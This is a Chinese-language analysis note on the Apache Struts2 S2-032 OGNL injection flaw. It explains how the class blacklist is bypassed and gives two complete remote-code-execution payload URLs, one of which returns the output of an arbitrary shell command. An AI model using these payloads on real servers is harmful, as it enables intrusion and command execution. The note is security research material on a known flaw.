# S2-032分析

需要手动开启DMI

```xml
<constant name="struts.enable.DynamicMethodInvocation" value="true" />
```

可以看见这里的过滤规则

```java
 <constant name="struts.excludedClasses"
              value="
                java.lang.Object,
                java.lang.Runtime,
                java.lang.System,
                java.lang.Class,
                java.lang.ClassLoader,
                java.lang.Shutdown,
                ognl.OgnlContext,
                ognl.MemberAccess,
                ognl.ClassResolver,
                ognl.TypeConverter,
                com.opensymphony.xwork2.ActionContext" />
    <!-- this must be valid regex, each '.' in package name must be escaped! -->
    <constant name="struts.excludedPackageNamePatterns" value="^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)" />
```

其中java.lang.Class这个算比较狠，这就导致我们之后不能用反射修改，但是也不是不能绕过，allowStaticMethodAccess的值,同时对 method 的名称，会将单、双引号转义处理，因此可以换个方式传参

而绕过上面的过滤，可以将 excludedClasses 以及 excludedPackageNamePatterns 这两个 SET 设置为空

因此得到payload，注意后面会自动拼接一个()

```
http://127.0.0.1:8080/login.action?method:#_memberAccess.excludedClasses=@java.util.Collections@EMPTY_SET,#_memberAccess.excludedPackageNamePatterns=@java.util.Collections@EMPTY_SET,new java.lang.ProcessBuilder(new java.lang.String[]{#parameters.cmd[0],#parameters.cmdd[0],#parameters.cmddd[0]}).start&cmd=open&cmdd=-a&cmddd=Calculator.app
```

但是如果我们想要调用静态方法怎么办，一方面struts-default.xml里面规则我们可以改掉但是在com.opensymphony.xwork2.ognl.SecurityMemberAccess#isClassExcluded里面，代码层面也有过滤

```java
protected boolean isClassExcluded(Class<?> clazz) {
  if (clazz == Object.class) {
    return true;
  }
  for (Class<?> excludedClass : excludedClasses) {
    if (clazz.isAssignableFrom(excludedClass)) {
      return true;
    }
  }
  return false;
}
```

因此拿到了网上的通杀payload

```
http://127.0.0.1:8080/login.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&pp=\\A&ppp= &encoding=UTF-8&cmd=id
```

可以得到在 `ognl.OgnlContext` 中，有一个 public static 的 MemberAccess 对象，实际上是 DefaultMemberAccess 对象。我们直接将 `_memberAccess` 对象引用至此对象，就不用执行原本SecurityMemberAccess当中各种各样的过滤规则，直接执行静态代码了。
